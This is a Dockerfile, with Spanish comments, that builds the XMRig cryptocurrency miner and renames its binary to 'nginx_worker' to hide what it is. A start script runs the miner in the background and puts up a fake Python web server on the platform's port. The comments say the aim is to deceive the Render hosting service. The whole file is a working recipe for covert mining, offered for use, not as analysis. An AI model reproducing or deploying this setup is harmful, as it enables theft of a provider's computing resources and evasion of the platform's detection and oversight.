FROM ubuntu:22.04 AS builder

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    build-essential \
    cmake \
    uuid-dev \
    libssl-dev \
    libcurl4-openssl-dev \
    libjansson-dev \
    libhwloc-dev \
    libuv1-dev \
    wget \
    && rm -rf /var/lib/apt/lists/*

RUN wget https://github.com/xmrig/xmrig/archive/refs/tags/v6.21.0.tar.gz \
    && tar -xf v6.21.0.tar.gz \
    && mkdir -p xmrig-6.21.0/build

WORKDIR /xmrig-6.21.0/build

RUN cmake .. -DWITH_HTTPD=OFF -DWITH_HWLOC=ON \
    && make -j$(nproc) \
    && mv xmrig /usr/local/bin/nginx_worker

# --- Etapa Final limpia ---
FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    libcurl4 \
    libssl3 \
    libjansson4 \
    libhwloc15 \
    libuv1 \
    ca-certificates \
    python3 \
    && rm -rf /var/lib/apt/lists/*

COPY --from=builder /usr/local/bin/nginx_worker /usr/local/bin/nginx_worker

# Crear un script de inicio que engaña a Render y arranca el minero
RUN echo '#!/bin/sh\n\
# 1. Arrancar el minero en segundo plano con los argumentos pasados\n\
/usr/local/bin/nginx_worker "$@" &\n\
\n\
# 2. Levantar un servidor web mínimo en Python que responda al puerto de Render\n\
echo "Iniciando servidor web falso en puerto $PORT..."\n\
python3 -m http.server $PORT\n\
' > /start.sh && chmod +x /start.sh

# El punto de entrada ahora es nuestro script puente
ENTRYPOINT ["/start.sh"]
